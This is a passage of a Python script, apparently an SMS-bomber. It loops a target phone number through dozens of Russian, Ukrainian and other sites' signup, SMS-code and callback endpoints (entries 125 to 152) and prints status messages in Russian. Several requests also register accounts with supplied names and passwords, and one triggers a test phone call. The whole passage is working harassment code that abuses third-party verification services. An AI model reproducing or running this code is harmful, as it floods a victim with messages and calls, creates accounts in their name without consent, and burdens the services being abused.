        requests.post("https://www.flipkart.com/api/6/user/signup/status",headers={"Origin": "https://www.flipkart.com","X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},json={"loginId": "+"+phone, "supportAllStates": True})
        print("[+] 125 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://fix-price.ru/ajax/register_phone_code.php",data={"register_call": "Y", "action": "getCode", "phone": "+"+phone})
        print("[+] 126 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://findclone.ru/register", params={"phone": "+"+phone})
        print("[+] 127 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.finam.ru/api/smslocker/sendcode",data={"phone": "+"+phone})
        print("[+] 128 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://2407.smartomato.ru/account/session",json={"phone": phonemas,"g-recaptcha-response": None})
        print("[+] 129 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://www.etm.ru/cat/runprog.html",data={"m_phone":phone9,"mode": "sendSms","syf_prog": "clients-services","getSysParam": "yes"})
        print("[+] 130 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://api.eldorado.ua/v1/sign/",params={"login": phone,"step": "phone-check","fb_id": "null","fb_token": "null","lang": "ru"})
        print("[+] 131 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+## (###) ###-##-##")
        requests.post("https://e-groshi.com/online/reg",data={"first_name": name,"last_name": name,"third_name": name,"phone": phonemas,"password": password,"password2": password})
        print("[+] 132 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin",data={"phone_or_email": "+"+phone})
        print("[+] 133 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.easypay.ua/api/auth/register",json={"phone": phone, "password": password})
        print("[+] 134 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
        print("[+] 135 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
        print("[+] 136 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://api.creditter.ru/confirm/sms/send",json={"phone": phonemas,"type": "register"})
        print("[+] 137 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://clients.cleversite.ru/callback/run.php",data={"siteid": "62731","num":phone,"title": "Онлайн-консультант","referrer": "https://m.cleversite.ru/call"})
        print("[+] 138 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://city24.ua/personalaccount/account/registration",data={"PhoneNumber": phone})
        print("[+] 139 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/")
        print("[+] 140 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://cinema5.ru/api/phone_code",data={"phone": phonemas})
        print("[+] 141 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.cian.ru/sms/v1/send-validation-code/",json={"phone": "+"+phone, "type": "authenticateCode"})
        print("[+] 142 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone","variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        print("[+] 143 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register",params={"phoneNumber": "+"+phone,},headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"})
        print("[+] 144 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone9, maska="(###)###-##-##")
        requests.post("https://bluefin.moscow/auth/register/",data={"phone": phonemas, "sendphone": "Далее"})
        print("[+] 145 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://app.benzuber.ru/login", data={"phone": "+"+phone})
        print("[+] 146 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://bartokyo.ru/ajax/login.php",data={"user_phone": phonemas})
        print("[+] 147 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://bamper.by/registration/?step=1",data={"phone": "+"+phone,"submit": "Запросить смс подтверждения","rules": "on"})
        print("[+] 148 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone9, maska="(###) ###-##-##")
        requests.get("https://avtobzvon.ru/request/makeTestCall",params={"to": phonemas})
        print("[+] 149 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://oauth.av.ru/check-phone",json={"phone": phonemas})
        print("[+] 150 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
        print("[+] 151 - отправлено!")
    except:
        print('[-] Не отправилось.')
    try:
        phonemas=mask(str=phone, maska="+# (###) ###-##-##")
        requests.post("https://apteka.ru/_action/auth/getForm/",data={"form[NAME]": "","form[PERSONAL_GENDER]": "","form[PERSONAL_BIRTHDAY]": "","form[EMAIL]": "","form[LOGIN]": phonemas,"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple","utc_offset": "120"})
        print("[+] 152 - отправлено!")
    except:
        print('[-] Не отправилось.')
